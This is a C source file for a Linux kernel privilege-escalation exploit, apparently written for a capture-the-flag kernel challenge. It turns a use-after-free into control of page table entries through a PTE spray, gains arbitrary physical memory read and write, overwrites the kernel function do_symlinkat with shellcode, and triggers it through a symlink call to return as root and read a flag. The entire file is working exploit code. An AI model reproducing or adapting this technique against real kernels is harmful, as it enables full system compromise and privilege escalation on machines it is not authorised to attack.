#include "libs/pwn.h"
#include "linux6.6.22/shellcode.h"
#include <stdlib.h>
#include <sys/sendfile.h>
#include <sched.h>
#include <sys/wait.h>
#include <unistd.h>

/*******************************
 * EXPLOIT                     *
 *******************************/

/*
 * inspired by https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606#UAF-in-physical-memory
 * this version overwrites do_symlinkat with privilige escalation shellcode
 */

 // can't call logging helpers directly
 //  BUG: Bad page cache in process pwn  pfn:02850

int fd, dmafd, ezfd = -1;
static void win() {
  char buf[0x100] = {0};
  int fd = open("/dev/sda", O_RDONLY);
  if (fd < 0) {
    puts(LERROR "Lose...");
    exit(EXIT_FAILURE);
  } else {
    puts(LINFO "Win!");
    read(fd, buf, 0x100);
    fputs(LINFO "flag: ", stdout);
    fputs(buf, stdout);
    puts(LINFO "Done");
  }
  exit(EXIT_SUCCESS);
}

uint64_t user_cs, user_ss, user_rsp, user_rflags;
static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

#define N_SPRAY 0x400
// size for direct cross cache attack
#define PTE_SIZE 0x10000

int main(int argc, char* argv[]) {
  void *ptr;
  uint64_t pte;
  char leak[PTE_SIZE] = {0};
  char *spray[N_SPRAY];

  lstage("INIT");
  pin_cpu(0, 0);
  save_state();
  init();

  lstage("START");

  for (int i = 0; i < N_SPRAY; i++)
    spray[i] = mmap((void*)(0xdead000000 + i*0x10000), 0x8000,
             PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0);

  linfo("create dangeling ptr");
  ptr = keap_malloc(PTE_SIZE, GFP_KERNEL_ACCOUNT);
  keap_write(ptr, leak, PTE_SIZE);
  keap_free(ptr);

  linfo("spray PTEs");
  for (int i = 0; i < N_SPRAY; i++)
    for (int j = 0; j < 8; j++)
      *(uint64_t*)(spray[i] + j*0x1000) = 0x6fe1be2;

#ifdef DEBUG
  keap_read(ptr, leak, PTE_SIZE);
  print_hex(leak, 0x80);
#endif

  keap_read(ptr, &pte, 0x8);
  CHK((char)pte == 0x67);

  linfo("corrupt PTE using UAF with fixed physical address");
  // fixed physical address
  pte = 0x800000000009c067;
  keap_write(ptr, &pte, 0x8);

  linfo("find corrupted page");
  void *vuln = 0;
  uint64_t physbase = 0;
  for (int i = 0; i < N_SPRAY; i ++) {
    for (int j = 0; j < 8; j++) {
      if (*(uint64_t*)(spray[i]+j*0x1000) != 0x6fe1be2) {
        vuln = (uint64_t*)(spray[i]+j*0x1000);
        physbase = (*(uint64_t*)vuln & ~0xfff);
        break;
      }
    }
    if (physbase)
      break;
  }

  CHK(physbase);

  linfo("physbase = 0x%lx\n", physbase);

  linfo("corrupt PTE into AAW/AAR");
  // grep do_symlinkat /proc/kallsyms
  // 0xffffffff811bbe10
  uint64_t do_symlinkat_func = 0x11bbe10;
  // physbase with nokaslr + 0x3000 (only if kaslr is enabled)
  uint64_t offset = 0x2401000 + 0x3000;

  pte = 0x8000000000000067|(physbase+(do_symlinkat_func & ~0xfff)-offset);

  keap_write(ptr, &pte, 0x8);

#ifdef DEBUG
  keap_read(ptr, leak, PTE_SIZE);
  print_hex(leak, 0x80);
#endif

  // reload pte or sth idk
  void* old_vuln = vuln;
  vuln = NULL;
  for (int i = 0; i < N_SPRAY; i ++) {
    for (int j = 0; j < 8; j++) {
      if (*(uint64_t*)(spray[i]+j*0x1000) != 0x6fe1be2) {
        vuln = (uint64_t*)(spray[i]+j*0x1000);
        break;
      }
    }
    if (vuln)
      break;
  }
  CHK(vuln == old_vuln);

#ifdef DEBUG
  keap_read(ptr, leak, PTE_SIZE);
  print_hex(leak, 0x80);
#endif

  lstage("PRIVESC");
  linfo("preparing shellcode");
  void *p;
  p = memmem(shellcode, sizeof(shellcode), "\x22\x22\x22\x22\x22\x22\x22\x22", 8);
  *(size_t*)p = (size_t)&win;
  p = memmem(shellcode, sizeof(shellcode), "\x44\x44\x44\x44\x44\x44\x44\x44", 8);
  *(size_t*)p = user_rflags;
  p = memmem(shellcode, sizeof(shellcode), "\x55\x55\x55\x55\x55\x55\x55\x55", 8);
  *(size_t*)p = user_rsp;

  linfo("overwriting do_symlinkat_at");
  memcpy(vuln + (do_symlinkat_func & 0xfff), shellcode, sizeof(shellcode));

  linfo("%d", symlink("/jail/x", "/jail"));
  lerror("Failed...");

}
